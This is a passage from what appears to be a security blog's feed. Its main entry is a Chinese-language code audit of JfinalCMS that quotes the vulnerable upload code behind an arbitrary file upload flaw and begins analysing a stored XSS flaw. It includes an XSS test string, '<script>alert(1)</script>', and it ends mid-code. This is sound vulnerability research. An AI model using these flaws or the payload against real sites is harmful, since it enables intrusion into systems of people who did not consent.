daa9f1072c1cb9c58de2632043b15c41901a00c99195044739b9fc876415bbceab347108a0975427b5d409ccb4ebd448c6d9b4280dcabcc5fcade54631c0239c7b73f5b6bc4ffc5347c58f017bbabba9f9038749d3714f9b823a62c65c53d361f50fa7ec8ec24c36112a4485f7684cbaf77ec4ef2d479c71d8ea2780b97095d6e8c7ef94bd2ac84a9623074d2d3511150671a6cabe2def5e13fc513d73a86123e6d6f8bcec134adfc69eba9f107dea4913eed675e7e7ae4cd22185fd7bed7e06f7032d437d87dc2921c9721c363532f1d1c79245471fcbd23701fca380d348d54e69f65dbb9f388ce5964848de42a73f6c86fa4c08d8fcc02b6845880381d2204546aa510d2aa9eedc172f4ef4a7d6e11ed2006b8be94b140e5d3f277d881d5af31eaf016825e5fd39d5a1d2383baab557dd92d9a42471b4ae3fa29ceb10280dcf1d4a4ba23a65e9c34d8a923234b9fd3646d37af06d26c2365fbc193b36e4040c9f5a0b5691d63b0633509240f4fb1509910d92fbed23891bcf73ef744f3db66c921d7de49de26e650b74da30904e211854b3cda68fc96cda86ff036b52e6471c60cc80e3209aefe99912e80a4e8e234f7edef11564c97c2b1f8969bac0f0ec298a9c5a9c6a783ca907c3b977f6e94d67f193149694561d9674211a57184cab9a4b41a1e40776645dd8822511d700ff0767a499c5eb4e6430a54848a3ab2610d6e061ad565dfedfc81827d835ae936ddc1ff1d3a5769d92e96d98396c1698a2e945651b90d3313f1246d8aaea8429b0bb540e35ef761c31dada96cefa8761c032c7fd15d00d179d44b571edafe041ada584141bccb233255fb1b369bd70cd03d85c544c79815f9774cc295deac8ff92ed477f76cfc6ab73827667bcd62e8cb71a2730aa6792d3f61fdc40ab6b5c9c44462bd607327f5d4ec5ae1942dd929c4ebeb320fee7af68e9c8c7cc25856a4c85bd7cb6488fff531f204be695f1fdec72e9ad51187b327e9ea65d97d31e5e799c688b77ebbb5ac8364b42982e3b12242a37faaab9a25b348ad0f21ab12cffb7311c6ee0ddccbcca36759496d299f5d8e690f70b7c34efe9ff6652aee943fefa14270692cbfb958fc39f6a6801c1bfb88957a1434a020516fe451a0f430f79c16a0b39bf830487d1d7db59afe7b0dd20c79496f52f4776092a9d0d2edf0c0451ffa5f1f1037b4a16b64a0df747ea240d0aeee0253aa5ddd4a778c8ea837a9699cbb8d9cd48eb1bd68dbf0ef0d4e48b54dcf36de4caaca8dc62c59dab6d7aed861a7cc0cb94ca3a655ed59f6da19364dc4d704544c66576cddc3494f3c4187c4acc58ef428a0c7b645487b3e0090b61e378327d96c1b3981597028374b4a8dec044b90cd6a5244659898bbb62ceedb96345bba5af36633693ccfe553ce2f3c0f9b4a434fff0c96beb75c403032e9cc9137792d74b9942329f4baa4e4faaffbeba9f3c6c6b6a856b6faf3a3fc1ec9dbfcbfeafba693e9ed855f223c60dc42126cd59ec38869f2fa3cd4cc747246492431e9a67cc20a9f81259861c6513382214d4fb5a38268545c28634d33a33adcf7d9410dafa91bc6aa83bdfb4e4d64d9c3043dca35b19aec1775280b46e05cffbbb024d24d3d7d4dbc343124c67e2f67867fd025ac99a96c9f3dc42baf785238d2a92fb176113d7b6caf2395f30a65143408f9efbe0d85f6326037022d5f0314b754d4fa83c687875ff4120273683dc43d98f1391b01e2b9b13edebf5618a468504528316c53443bfdf8b0f7592c43e29fc654e16922b8ee265d93c59da7f1f4302ebea6c4cb039f10f3dd6439c256da8d4fc2df85dcd19d8ceeca7692febc642937a623a94e53351431c58204c17a6d0adbf0aed486c9232b05f3d79eda5d027031c4cdcbc7ecea34a9102e5f05a9535f6a89594cb7597196214d90c02a7e4bffc567fc77a30ba7dd129375a9ced35a6a91e0458e44f2b6f752b8d6ad966c590871beae8d37a1953456fe119e1362f53d5d44108ba40963f2829adee43b360cc993c563e513292ff7199ae21824a6499fec6f7c0122b4e083c763d0d70e6328afde1f0f96389e8a75f21f7887bfd4cd9150499c70c993d802e3b0958b8719bd216b6031483255afa1c857cddcd5f570e95b5c7cea14f5266702ec2dc937b2dab4f8af2591ddd5a548d724aa4d42342c354365bb9ccfa8338eecec54a6b84b169f02e4393b32e137eccf678051976763a58f46452071b8c05b9a658d4856ea265672200a4b0051bc3e5334d78dad0ad39c3954ada017f93e8160eb0e5d89e3cabef0c77bfd42c64c553a94db05ece5ce75c21740ddb4a2a61a1f18f6df24750d4fe0ac886b1c32a45a74f92462e4de44673c483cf6210ee4db1e723b6ab09158a880215ae0920d4f529ad74e268c46fd6f2bc301e1e50ad2d3ec16a035a6ed316e41905f844e2c3069d1fe6aa8ab0f377309d27217c083f6c4db16035925dcd9c0e57da76139347600c2976d9c3eaf1f3c3d4b7aa316304e82c59d1fa5becb7b44e6d3cc876631515418ec65deea9293e9decf7fe065559437619e9f7e441b9229b1b1ad1a974b282c5f721f646515f2e7026ded1d98c92a55dc6466e98ed536dbb1d6afb7a9e31903839f36a040af92be6c1aa8d5d39d2b490b1cbffeb3fa92a4c90e15ac915f5d6ce9e68ea11aab458451b27cc6e9077470dfa06c09208e4a9b47734d52476ceb1a069f4a6d11f1686e0941faa538b2d756d1edeb4c367b2092af81f50de775207672fc370b3341c058b4a4173bd468579b447a4135e143e841a3d3a68bbf66499167fe234f52f7186307c498d23d2e06aeef2ac621e68c3efea18052e3f9b6960444b538eff8d5ced84b01be43a96237b0ae72daa9c49b0edbf8816d2b073a9f47d1f224cc92d7e246e903ac2e01ac4893e1e49d231719c684cffaf113f58a02623b849dc2b80a2dc2f746e1922c9446504cb605015e8c3785bd6c74a4bdc575460f4f29c79f639c4cdcd3c457893db3639a7a5b75fc705109030ff773089c5a2293e9025908139f175b6b3c43091de4cd32639b49dfbfa41d8822971b87be25b7211b862f4252d4ece1f144f17246299a563265e43873c2a16d48ee34610a16ce8e85e3416b6f3db59ba0cdbca99c40c5a8a812db10d9ef475dea147979431ea30d87541b8a2184cf1b02c90edad7a166924f97b9231def03c2f4f90374209ab7084f9dda432e1709ab18d05b31559741acd4ef0d775ca8cccfcc7189f225b446398aed2f5a8a4c00a732868b85529115f24fe943a1bff02b832c6d16d06fa5e2c6eef3200766398d0631f2bb9a5a5951feff6c326d09099682aaa384c063ee95afb6842c2815cd36ed9f18012e8060be18b359264d099d1f749527e2e19878af0b205cebc894d01464e224714890528a36cbcf3ef49241fe4f98343800c79eb4b8e07b0b2253fcd62f2cf71bbc0f9b8b7350a29e51e6d75c5cf2ad516df6101861091fb82e8ab648acb11ad18972946f56b460c12f5921e67616a98549d8c266e2eede193316462ddeacd5f7dc2ef1804095a8f1f414f0ec8ac8dda056e07cac1d1ebe36a7c95c27e74d3cb8f4633b432131b68b54f5c675d0b63a9320daf2e9674fccb2a7934e6a399e4d98d3714ebbfa56812551f15926b48e88a2377f5ffa2f4ea8f3532980deae4cbb924909a11dd980af75a143</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java shiro" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>一次意外的代码审计----JfinalCMS审计</title>
    <link href="https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/"/>
    <id>https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-12-20T13:27:45.000Z</published>
    <updated>2020-12-21T07:12:31.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CVE。<br>&emsp;&emsp; 认真严肃的挑选了一波之后，我选择了这个CMS，可能是缘分，也可能是好玩吧。主要看的是这个项目有QQ群，可以加群讨论一下问题，方便更好的研究。先加群不说别的。<a href="https://gitee.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">gitee地址</a>，<a href="https://github.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">GitHub地址</a>。<br><img src="https://img-blog.csdnimg.cn/20200407202518575.png" alt="在这里插入图片描述"></p><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp;环境的搭建很简单，几种方式可以选择。第一种直接git项目的源码，idea打开项目，然后idea会自动导入下载maven。<br><img src="https://img-blog.csdnimg.cn/20200412200121848.png" alt="在这里插入图片描述"><br>第二种方式是去GitHub或者Gitee上下载发行版。<br><a href="https://gitee.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">gitee下载地址</a><br><a href="https://github.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">github下载地址</a></p><hr><h1 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h1><p>&emsp;&emsp; <a href="https://samny.blog.csdn.net//details/105385042" target="_blank" rel="noopener">Arbitrary file upload vulnerability</a>文件上传漏洞存在于管理员后台中的模板管理。</p><p><img src="https://img-blog.csdnimg.cn/20200411154350644.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200406165725733.png" alt><br><img src="https://img-blog.csdnimg.cn/20200406165740279.png" alt="&lt;script&gt;alert(1)&lt;/script&gt;"></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 断点调试，断点设置在<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>模板页面的操作的都是由FileManangerController.java控制。</p><ol><li><code>HttpServletRequest request = getRequest();</code>有点Java知识的人都认识这个,所以第一个断点设置在这里。<br><img src="https://img-blog.csdnimg.cn/2020041116011776.png" alt="在这里插入图片描述"></li><li>第二个断点，审计的上传漏洞，肯定设置在上传方法里。<br><img src="https://img-blog.csdnimg.cn/20200411160132564.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h3><p><code>判断是否为空的操作</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Iterator&lt;?&gt; it = <span class="keyword">this</span>.files.iterator();</span><br><span class="line">        <span class="keyword">if</span> (!it.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 项目主说这里修改一下就好了，但默认是这样子的，可见开发者自以为是可以防止任意上传文件漏洞，但其实这里默认是这样子设置。<br><img src="https://img-blog.csdnimg.cn/20200412135823674.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 默认设置是一次最多上传5个文件，文件大小不超过16MB。<br><img src="https://img-blog.csdnimg.cn/20200412142146187.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> maxSize = NumberUtils.parseLong(MAX_SIZE);</span><br><span class="line"><span class="keyword">if</span> (getConfig(<span class="string">"upload-size"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    maxSize = Integer.parseInt(getConfig(<span class="string">"upload-size"</span>));</span><br><span class="line">    <span class="keyword">if</span> (maxSize != <span class="number">0</span> &amp;&amp; item.getSize() &gt; (maxSize * <span class="number">1024</span> * <span class="number">1024</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.error(sprintf(lang(<span class="string">"UPLOAD_FILES_SMALLER_THAN"</span>), maxSize + <span class="string">"Mb"</span>));</span><br><span class="line">        error = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 这里maxSize是默认为0。<br><img src="https://img-blog.csdnimg.cn/2020041214043196.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020041214394072.png" alt="在这里插入图片描述"><br>&emsp;&emsp;  下面的一段代码是判断是否只能上传图片，在配置文件<code>E:\Soures\jfinal_cms\src\main\resources\conf\filemanager.properties</code>下可以看到文件复写和上传文件大小设置是为0的（<code>0代表的是没有限制</code>），默认是可以上传其他文件（<code>upload-imagesonly=false</code>）。<br><img src="https://img-blog.csdnimg.cn/20200412144828539.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isImage(item.getName())</span><br><span class="line">        &amp;&amp; (getConfig(<span class="string">"upload-imagesonly"</span>) != <span class="keyword">null</span> &amp;&amp; getConfig(<span class="string">"upload-imagesonly"</span>).equals(<span class="string">"true"</span>) || <span class="keyword">this</span>.params</span><br><span class="line">        .get(<span class="string">"type"</span>) != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.params.get(<span class="string">"type"</span>).equals(<span class="string">"Image"</span>))) &#123;</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"UPLOAD_IMAGES_ONLY"</span>));</span><br><span class="line">    error = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建临时文件，后面会用到。作用是先将上传的文件以临时文件的存放着，然后把复制到上传目录下，重新命名删除临时文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            tmpFile = <span class="keyword">new</span> File(<span class="keyword">this</span>.fileRoot + TMP_PATH + <span class="string">"filemanager_"</span> + System.currentTimeMillis() + <span class="string">".tmp"</span>);</span><br><span class="line">            File filePath = tmpFile.getParentFile();</span><br><span class="line">            <span class="keyword">if</span> (!filePath.exists()) &#123;</span><br><span class="line">                filePath.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            item.write(tmpFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 文件上传后的操作，也就是上面说到的复制重命名，最后将临时文件删除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// file rename</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; tmpFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String allowed[] = &#123;<span class="string">"."</span>, <span class="string">"-"</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"add"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String currentPath = <span class="string">""</span>;</span><br><span class="line">                String fileName = params.get(<span class="string">"_fileName"</span>);</span><br><span class="line">                String filePath = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    currentPath = params.get(<span class="string">"currentpath"</span>);</span><br><span class="line">                    respPath = currentPath;</span><br><span class="line">                    currentPath = <span class="keyword">new</span> String(currentPath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    currentPath = getFilePath(currentPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                filePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + currentPath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(filePath, fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(filePath + fileName);</span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"replace"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String fileName = <span class="string">""</span>;</span><br><span class="line">                String newFilePath = <span class="string">""</span>;</span><br><span class="line">                String saveFilePath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    newFilePath = params.get(<span class="string">"newfilepath"</span>);</span><br><span class="line">                    newFilePath = <span class="keyword">new</span> String(newFilePath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    respPath = newFilePath.substring(<span class="number">0</span>, newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    fileName = newFilePath.substring(newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    newFilePath = getFilePath(newFilePath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                saveFilePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + newFilePath);</span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(saveFilePath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(saveFile.getParent(), fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (saveFile.exists()) &#123;</span><br><span class="line">                    <span class="comment">// before bakup</span></span><br><span class="line">                    bakupFile(saveFile);</span><br><span class="line">                    <span class="comment">// delete src file</span></span><br><span class="line">                    saveFile.delete();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">        <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 临时文件处理</span></span><br><span class="line">    <span class="keyword">if</span> (tmpFile.exists()) &#123;</span><br><span class="line">        tmpFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fileInfo;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>开发者需要通过限制上传文件大小来限制一些文件的上传，但默认配置是没有限制，很可能是开发者为了自己开发方便，但最后忘记修改设置。</li><li>上传文件，判断是否是上传图片之后，没有在做其他判断限制，然后导致任意文件上传漏洞。</li><li>配置文件中默认是不开启<code>filemanager.upload-imagesonly</code>需要使用者手动设置。</li><li>开发者仅仅在前端做了文件上传的白名单，后端没有没有进行校验，导致黑客可以绕过前端验证，上传任意恶意文件。（前端验证本文没有体现，但真的做了限制，有详情的童鞋可以去看看。）</li></ol><hr><h1 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20200407185120625.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185154471.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185238421.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 漏洞源码存在于<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java</code><br>&emsp;&emsp; 第一部分功能有以下几个：</p><ol><li>将提交数据Json化</li><li>根据用户Session判断用户id（数据库内的id）</li><li>判断旧密码和新设置的密码是否正确</li><li>判断Email的格式是否正确<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">JSONObject json = <span class="keyword">new</span> JSONObject();</span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">2</span>);<span class="comment">// 失败</span></span><br><span class="line"></span><br><span class="line">SysUser user = (SysUser) getSessionUser();</span><br><span class="line"><span class="keyword">int</span> userid = user.getInt(<span class="string">"userid"</span>);</span><br><span class="line">SysUser model = getModel(SysUser<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (userid != model.getInt(<span class="string">"userid"</span>)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"提交数据错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方用户不需要密码</span></span><br><span class="line"><span class="keyword">if</span> (user.getInt(<span class="string">"usertype"</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">String oldPassword = getPara(<span class="string">"old_password"</span>);</span><br><span class="line">String newPassword = getPara(<span class="string">"new_password"</span>);</span><br><span class="line">String newPassword2 = getPara(<span class="string">"new_password2"</span>);</span><br><span class="line"><span class="keyword">if</span> (!user.getStr(<span class="string">"password"</span>).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"密码错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"两次新密码不一致！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword)) &#123; <span class="comment">// 输入密码并且一直</span></span><br><span class="line">model.set(<span class="string">"password"</span>, JFlyFoxUtils.passwordEncrypt(newPassword));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(model.getStr(<span class="string">"email"</span>)) &amp;&amp; model.getStr(<span class="string">"email"</span>).indexOf(<span class="string">"@"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"email格式错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span 